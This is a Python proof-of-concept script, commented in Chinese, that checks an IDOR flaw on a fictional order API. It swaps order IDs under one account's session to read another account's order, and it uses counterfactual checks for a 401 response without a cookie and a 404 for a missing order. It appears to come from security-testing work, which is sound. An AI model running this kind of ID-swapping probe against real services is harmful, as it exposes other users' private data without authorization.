#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# output/poc-acme-003.py — ACME-F-003 IDOR 越权读订单重放 PoC（脱敏演示，虚构目标）
#
# 用法:
#   python output/poc-acme-003.py --demo    # 离线回放验证逻辑（不发包，默认）
#   python output/poc-acme-003.py           # 实模式（连接失败属预期）
#
# 验证逻辑（GET-only，未批量）:
#   反证：替换订单 id → 返回他人订单（非 A 账号下单记录）
#   反事实：无 Cookie 401 / 不存在订单 404 / 与下单记录比对无此单

import sys
import urllib.error
import urllib.request

API = "https://api.demo-acme.example.com"  # 虚构目标
ENDPOINT = "/api/v1/orders"
REPLAY_SIGNATURE = '"order_no": "ORD-2026-08123"'
A_COOKIE = "session=demo-session-a"  # 虚构会话

# ---- 离线回放样本（虚构证据）----
DEMO_RESPONSES = {
    "ORD-2026-08121": '{"order_no": "ORD-2026-08121", "amount": 299.0, "addr_hash": "a1b2c3d4", "owner": "account-a"}',
    "ORD-2026-08123": '{"order_no": "ORD-2026-08123", "amount": 12999.0, "addr_hash": "e5f6a7b8", "owner": "account-b"}',
    "ORD-99999999": (404, '{"error": "order not found"}'),
}
A_ACCOUNT_ORDERS = {"ORD-2026-08121"}  # A 账号真实下单记录（虚构）


def http_get(url, cookie, timeout=10):
    req = urllib.request.Request(url, headers={"User-Agent": "poc-acme-003", "Cookie": cookie})
    try:
        with urllib.request.urlopen(req, timeout=timeout) as resp:
            return resp.status, resp.read().decode("utf-8", "ignore")
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode("utf-8", "ignore")
    except Exception as e:
        return 0, f"连接失败（虚构目标，预期行为）: {e}"


def main():
    demo = "--demo" in sys.argv
    print(f"===== PoC ACME-F-003 IDOR 越权读订单（{'离线回放' if demo else '实模式'}）=====")
    print(f"目标: {API}{ENDPOINT}/<id>（A 账号会话，GET-only 2 次即止）\n")

    probes = [
        ("A 账号自己订单", "ORD-2026-08121", A_COOKIE, "基线（归属内）"),
        ("替换他人订单", "ORD-2026-08123", A_COOKIE, "IDOR 反证"),
        ("不存在订单", "ORD-99999999", A_COOKIE, "数据真实性反证"),
        ("无 Cookie", "ORD-2026-08123", "", "未授权反证"),
    ]
    results = []
    for label, oid, cookie, note in probes:
        if demo:
            if not cookie:
                status, body = 401, '{"error": "unauthorized"}'
            else:
                entry = DEMO_RESPONSES.get(oid, DEMO_RESPONSES["ORD-99999999"])
                if isinstance(entry, tuple):
                    status, body = entry
                else:
                    status, body = 200, entry
        else:
            status, body = http_get(f"{API}{ENDPOINT}/{oid}", cookie)
        results.append((label, oid, status, body))
        print(f"[{label}] GET {ENDPOINT}/{oid}（{note}）")
        print(f"  → HTTP {status}")
        print(f"  响应: {body[:150]}\n")

    own, other, missing, noauth = results

    # ---- 判定 ----
    other_ok = '"owner": "account-b"' in other[3] and '"owner": "account-a"' not in other[3]
    own_ok = '"owner": "account-a"' in own[3]
    missing_ok = missing[2] == 404
    noauth_ok = noauth[2] in (401, 403)

    print("===== 反事实 4 问 =====")
    print(f"  {'✅' if own_ok and other_ok else '❌'} (1) 替换 id 返回他人订单（owner=account-b）→ 归属未校验")
    print(f"  {'✅' if noauth_ok else '❌'} (2) 无 Cookie → 401 → 确需登录，非未授权")
    print(f"  {'✅' if missing_ok else '❌'} (3) 不存在订单 → 404 → 数据真实存在，非统一误报")
    print(f"  {'✅' if other_ok else '❌'} (4) 证伪：ORD-2026-08123 不在 A 账号下单记录 {A_ACCOUNT_ORDERS} 中 → 无法推翻")

    sig_ok = REPLAY_SIGNATURE in other[3]
    print(f"\n===== replay_signature 校验 =====")
    print(f"  需要包含: {REPLAY_SIGNATURE} → {'✅ 命中' if sig_ok else '❌ 未命中'}")

    passed = own_ok and other_ok and missing_ok and noauth_ok and sig_ok
    print(f"\n结论: {'VERIFIED（IDOR 越权读取成立，GET-only 合规）' if passed else '保留 candidate，需补证据'}")
    return 0 if passed else 1


if __name__ == "__main__":
    sys.exit(main())
